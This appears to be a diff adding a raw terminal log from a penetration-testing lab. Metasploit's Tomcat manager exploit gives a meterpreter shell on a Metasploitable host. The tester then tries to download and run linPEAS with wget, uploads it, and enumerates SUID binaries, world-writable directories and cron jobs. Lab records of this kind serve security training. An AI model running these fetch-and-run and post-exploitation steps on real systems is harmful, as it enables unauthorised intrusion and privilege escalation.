@@ -1,0 +1,188 @@
+[1m[34m[*][0m Spooling to file /home/kali/vapt_lab/task3/results/linpeas_out_head.txt...
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1 -c "sed -n '1,200p' /tmp/linpeas_out.txt"
+[0m[1m[34m[*][0m Running 'sed -n '1,200p' /tmp/linpeas_out.txt' on meterpreter session 1 (192.168.222.129)
+sed: can't read /tmp/linpeas_out.txt: No such file or directory
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1 -c "ls -la /tmp"
+[0m[1m[34m[*][0m Running 'ls -la /tmp' on meterpreter session 1 (192.168.222.129)
+total 20
+drwxrwxrwt  4 root     root    4096 2025-10-07 11:50 .
+drwxr-xr-x 21 root     root    4096 2012-05-20 14:36 ..
+-rw-------  1 tomcat55 nogroup    0 2025-10-07 06:48 5191.jsvc_up
+drwxrwxrwt  2 root     root    4096 2025-10-07 06:47 .ICE-unix
+-rw-r--r--  1 tomcat55 nogroup    0 2025-10-07 11:50 linpeas.sh
+-r--r--r--  1 root     root      11 2025-10-07 06:48 .X0-lock
+drwxrwxrwt  2 root     root    4096 2025-10-07 06:48 .X11-unix
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1 -c "cd /tmp && wget -q -O linpeas.sh https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linpeas.sh && chmod +x linpeas.sh && ./linpeas.s h -a > linpeas_out.txt 2>&1 && echo DONE || echo FAILED"
+[0m[1m[34m[*][0m Running 'cd /tmp && wget -q -O linpeas.sh https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a > linpeas_out.txt 2>&1 && echo DONE || echo FAILED' on meterpreter session 1 (192.168.222.129)
+FAILED
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1 -c "cd /tmp && wget -q -O linpeas.sh https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linpeas.sh && chmod +x linpeas.sh && ./linpeas.s h -a > linpeas_out.txt 2>&1 && echo DONE || echo FAILED"
+[0m[1m[34m[*][0m Running 'cd /tmp && wget -q -O linpeas.sh https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a > linpeas_out.txt 2>&1 && echo DONE || echo FAILED' on meterpreter session 1 (192.168.222.129)
+FAILED
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > x[Kupload /home/kali/vapt_lab/tools/linpeas.sh /tmp/linpeas.sh
+[0m[1m[34m[*][0m Uploading  : /home/kali/vapt_lab/tools/linpeas.sh -> /tmp/linpeas.sh
+[1m[34m[*][0m Completed  : /home/kali/vapt_lab/tools/linpeas.sh -> /tmp/linpeas.sh
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > execute -f /bin/sh -a "-c 'chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh -a > /tmp/linpeas_out.txt 2>&1 &'" 
+[0mProcess  created.
+[4mmeterpreter[0m > execute -f /bin/sh -a "-c 'ls -lh /tmp/linpeas_out.txt 2>/dev/null || echo MISSING; echo \"---- head ----\"; head -n 20 /tmp/linpeas_out.txt 2>/dev/null || true'"
+[0mProcess  created.
+[4mmeterpreter[0m > execute -f /bin/sh -a "-c 'for i in \$(seq 1 30); do if [ -s /tmp/linpeas_out.txt ]; then echo READY; break; else sleep 1; fi; done; echo \"---- head ----\"; sed -n \"1,200p\" /tmp/linpeas_out.txt'"
+[0mProcess  created.
+[4mmeterpreter[0m > execute -f /bin/sh -a "-c 'sleep 2; if [ -s /tmp/linpeas_out.txt ]; then echo READY; ls -lh /tmp/linpeas_out.txt; sed -n \"1,200p\" /tmp/linpeas_out.txt; else echo MISSING; fi'"
+[0mProcess  created.
+[4mmeterpreter[0m > shell
+[0mProcess 8 created.
+Channel 9 created.
+uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+---- sudo -l ----
+[sudo] password for tomcat55: 
+Terminate channel 9? [y/N]  [4mmeterpreter[0m > echo "---- SUID (first 200 lines) ----"; find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | sed -n '1,200p'; echo "---- World-writable dirs (first 200 lines) ----"; find / -xdev -type d -perm -0002 -exec ls -ld {}  \; 2>/dev/null | sed -n '1,200p'; echo "---- Cron related files ----"; ls -la /etc/cron* /var/spool/cron 2>/dev/null || true
+[0m[1m[31m[-][0m Unknown command: echo. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > erminate channel 9? [y/N]  y
+[0m[1m[31m[-][0m Unknown command: erminate. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > meterpreter > echo "---- SUID (first 200 lines) ----"; find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | sed -n '1,200p'; echo "---- World-writable dirs (first 200 lines) ----"; find / -xdev -type d -perm -0002 - exec ls -ld {} \; 2>/dev/null | sed -n '1,200p'; echo "---- Cron related files ----"; ls -la /etc/cron* /var/spool/cron 2>/dev/null || true
+[0m[1m[31m[-][0m Unknown command: meterpreter. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > [-] Unknown command: echo. Run the help command for more details.
+[0m[1m[31m[-][0m Unknown command: [-]. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > shell
+[0mProcess 9 created.
+Channel 10 created.
+-rwsr-xr-x 1 root root 63584 2008-04-14 23:36 /bin/umount
+-rwsr-xr-- 1 root fuse 20056 2008-02-26 13:25 /bin/fusermount
+-rwsr-xr-x 1 root root 25540 2008-04-02 21:08 /bin/su
+-rwsr-xr-x 1 root root 81368 2008-04-14 23:36 /bin/mount
+-rwsr-xr-x 1 root root 30856 2007-12-10 12:33 /bin/ping
+-rwsr-xr-x 1 root root 26684 2007-12-10 12:33 /bin/ping6
+-rwsr-xr-x 1 root root 65520 2008-12-02 14:31 /sbin/mount.nfs
+-rwsr-xr-- 1 root dhcp 2960 2008-04-02 09:38 /lib/dhcp3-client/call-dhclient-script
+-rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudoedit
+-rwsr-sr-x 1 root root 7460 2008-06-25 16:53 /usr/bin/X
+-rwsr-xr-x 1 root root 8524 2007-11-22 07:14 /usr/bin/netkit-rsh
+-rwsr-xr-x 1 root root 37360 2008-04-02 21:08 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 12296 2007-12-10 12:33 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudo
+-rwsr-xr-x 1 root root 12020 2007-11-22 07:14 /usr/bin/netkit-rlogin
+-rwsr-xr-x 1 root root 11048 2007-12-10 12:33 /usr/bin/arping
+-rwsr-sr-x 1 daemon daemon 38464 2007-02-20 08:41 /usr/bin/at
+-rwsr-xr-x 1 root root 19144 2008-04-02 21:08 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 28624 2008-04-02 21:08 /usr/bin/chfn
+-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
+-rwsr-xr-x 1 root root 23952 2008-04-02 21:08 /usr/bin/chsh
+-rwsr-xr-x 1 root root 15952 2007-11-22 07:14 /usr/bin/netkit-rcp
+-rwsr-xr-x 1 root root 29104 2008-04-02 21:08 /usr/bin/passwd
+-rwsr-xr-x 1 root root 46084 2008-03-31 00:32 /usr/bin/mtr
+-rwsr-sr-x 1 libuuid libuuid 12336 2008-03-27 13:25 /usr/sbin/uuidd
+-rwsr-xr-- 1 root dip 269256 2007-10-04 15:57 /usr/sbin/pppd
+-rwsr-xr-- 1 root telnetd 6040 2006-12-17 21:16 /usr/lib/telnetlogin
+-rwsr-xr-- 1 root www-data 10276 2010-03-09 15:52 /usr/lib/apache2/suexec
+-rwsr-xr-x 1 root root 4524 2007-11-05 15:48 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 165748 2008-04-06 07:50 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 9624 2009-08-17 21:04 /usr/lib/pt_chown
+drwxrwxrwt 3 root root 60 2025-10-07 06:48 /var/lock
+drwx-wx-wt 2 root root 86016 2025-10-07 09:39 /var/lib/php5
+drwxrwxrwt 2 root root 4096 2012-05-20 14:17 /var/tmp
+drwxrwxrwt 2 root root 4096 2025-10-07 08:58 /var/www/dav
+drwxrwxrwx 2 www-data www-data 12288 2025-10-07 08:47 /var/www/twiki/data/Sandbox
+drwxrwxrwx 2 www-data www-data 20480 2025-10-07 08:48 /var/www/twiki/data/Main
+drwxrwxrwx 2 www-data www-data 4096 2025-10-07 08:47 /var/www/twiki/data/Know
+drwxrwxrwx 2 www-data www-data 36864 2025-10-07 08:48 /var/www/twiki/data/TWiki
+drwxrwxrwx 2 www-data www-data 4096 2003-01-30 03:15 /var/www/twiki/data/_default
+drwxrwxrwx 2 www-data www-data 4096 2003-02-01 07:05 /var/www/twiki/data/Trash
+drwxrwxrwx 2 www-data www-data 4096 2002-04-21 02:05 /var/www/twiki/pub/Sandbox
+drwxrwxrwx 2 www-data www-data 4096 2002-04-07 05:38 /var/www/twiki/pub/Main
+drwxrwxrwx 3 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/Know
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/Know/IncorrectDllVersionW32PTH10DLL
+drwxrwxrwx 8 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki
+drwxrwxrwx 2 www-data www-data 4096 2003-01-21 20:51 /var/www/twiki/pub/TWiki/TWikiDocGraphics
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/TWikiTemplates
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/TWikiLogos
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/PreviewBackground
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/FileAttachment
+drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/WabiSabi
+drwxrwxrwx 2 www-data www-data 4096 2001-12-04 02:25 /var/www/twiki/pub/Trash
+drwxrwxrwx 2 www-data www-data 4096 2003-02-01 18:46 /var/www/twiki/pub/icn
+drwxrwxrwt 4 root root 4096 2025-10-07 12:03 /tmp
+drwxrwxrwt 2 root root 4096 2025-10-07 06:47 /tmp/.ICE-unix
+drwxrwxrwt 2 root root 4096 2025-10-07 06:48 /tmp/.X11-unix
+-rw-r--r-- 1 root   root    724 2008-04-08 14:02 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 2012-05-14 01:30 .
+drwxr-xr-x 94 root root 4096 2025-10-07 12:05 ..
+-rw-r--r--  1 root root  492 2010-01-06 17:05 php5
+-rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+-rw-r--r--  1 root root 1323 2008-03-31 09:16 postgresql-common
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 2010-04-28 02:51 .
+drwxr-xr-x 94 root root 4096 2025-10-07 12:05 ..
+-rwxr-xr-x  1 root root  633 2008-02-01 23:10 apache2
+-rwxr-xr-x  1 root root 7441 2008-04-22 11:20 apt
+-rwxr-xr-x  1 root root  314 2008-04-04 05:56 aptitude
+-rwxr-xr-x  1 root root  502 2007-12-12 08:59 bsdmainutils
+-rwxr-xr-x  1 root root   89 2006-06-19 14:21 logrotate
+-rwxr-xr-x  1 root root  954 2008-03-12 09:24 man-db
+-rwxr-xr-x  1 root root  183 2008-03-08 13:22 mlocate
+-rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+-rwxr-xr-x  1 root root  383 2010-04-28 02:34 samba
+-rwxr-xr-x  1 root root 3295 2008-04-08 14:02 standard
+-rwxr-xr-x  1 root root 1309 2007-11-23 04:06 sysklogd
+-rwxr-xr-x  1 root root  477 2008-12-07 14:17 tomcat55
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 2010-03-16 19:11 .
+drwxr-xr-x 94 root root 4096 2025-10-07 12:05 ..
+-rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+
+/etc/cron.monthly:
+total 20
+drwxr-xr-x  2 root root 4096 2010-04-28 02:26 .
+drwxr-xr-x 94 root root 4096 2025-10-07 12:05 ..
+-rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+-rwxr-xr-x  1 root root  664 2008-02-20 23:22 proftpd
+-rwxr-xr-x  1 root root  129 2008-04-08 14:02 standard
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 2010-03-16 19:11 .
+drwxr-xr-x 94 root root 4096 2025-10-07 12:05 ..
+-rwxr-xr-x  1 root root  528 2008-03-12 09:24 man-db
+-rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+-rwxr-xr-x  1 root root 2522 2008-01-28 12:47 popularity-contest
+-rwxr-xr-x  1 root root 1220 2007-11-23 04:06 sysklogd
+
+/var/spool/cron:
+total 20
+drwxr-xr-x 5 daemon daemon  4096 2010-03-16 19:11 .
+drwxr-xr-x 5 root   root    4096 2010-04-28 02:47 ..
+drwxrwx--T 2 daemon daemon  4096 2010-03-16 19:11 atjobs
+drwxrwx--T 2 daemon daemon  4096 2007-02-20 08:41 atspool
+drwx-wx--T 2 root   crontab 4096 2008-04-08 14:02 crontabs
+#!/bin/sh
+
+NAME=tomcat5.5
+DEFAULT=/etc/default/$NAME
+
+# The following variables can be overwritten in $DEFAULT
+
+# Default for number of days to keep old log files in /var/log/tomcat4/
+LOGFILE_DAYS=14
+
+# End of variables that can be overwritten in $DEFAULT
+
+# overwrite settings from default file
+if [ -f "$DEFAULT" ]; then
+	. "$DEFAULT"
+fi
+
+if [ -d /var/log/$NAME ]; then
+	find /var/log/$NAME/ -name \*.log -mtime +$LOGFILE_DAYS -print0 \
+		| xargs --no-run-if-empty -0 rm
+fi
+
